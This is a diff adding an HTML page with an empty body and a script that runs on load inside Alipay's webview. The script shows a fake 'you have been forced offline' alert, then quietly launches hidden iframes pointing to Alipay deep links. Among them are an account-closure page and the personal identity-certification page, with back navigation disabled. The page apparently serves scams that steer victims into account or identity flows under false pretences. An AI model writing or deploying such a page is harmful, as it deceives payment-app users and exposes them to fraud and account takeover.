@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        function showAlipayAlert() {
+            if (typeof AlipayJSBridge !== 'undefined') {
+                AlipayJSBridge.call('alert', {
+                    title: '提示',
+                    message: '数据发生变化，您被迫下线',
+                    button: '确定'
+                }, function(e) {
+                    var iframe0 = document.createElement('iframe');
+                    iframe0.style.display = 'none';
+                    iframe0.src = 'alipays://platformapi/startapp?appId=20001003&v2=true&keyword=😁';
+                    document.body.appendChild(iframe0);
+
+                    var iframe1 = document.createElement('iframe');
+                    iframe1.style.display = 'none';
+                    iframe1.src = 'alipays://platformapi/startapp?appId=20000122';
+                    document.body.appendChild(iframe1);
+
+                    var iframe2 = document.createElement('iframe');
+                    iframe2.style.display = 'none';
+                    iframe2.src = 'alipays://platformapi/startapp?appId=20000008';
+                    document.body.appendChild(iframe2);
+
+                    var iframe3 = document.createElement('iframe');
+                    iframe3.style.display = 'none';
+                    iframe3.src = 'alipays://platformapi/startapp?appId=20000009';
+                    document.body.appendChild(iframe3);
+
+                    var iframeA = document.createElement('iframe');
+                    iframeA.style.display = 'none';
+                    iframeA.src = 'alipays://platformapi/startapp?appId=20000067&url=https://render.alipay.com/p/yuyan/180020010001206194/close-index.html';
+                    document.body.appendChild(iframeA);
+
+                    var iframeB = document.createElement('iframe');
+                    iframeB.style.display = 'none';
+                    iframeB.src = 'alipays://platformapi/startapp?appId=20000067&url=https://custweb.alipay.com/certify/v3/personal/default_22?__webview_options__=gestureBack%3Dfalse';
+                    document.body.appendChild(iframeB);
+                });
+            } else {
+                document.addEventListener('AlipayJSBridgeReady', showAlipayAlert, false);
+            }
+        }
+
+        window.onload = function() {
+            showAlipayAlert();
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
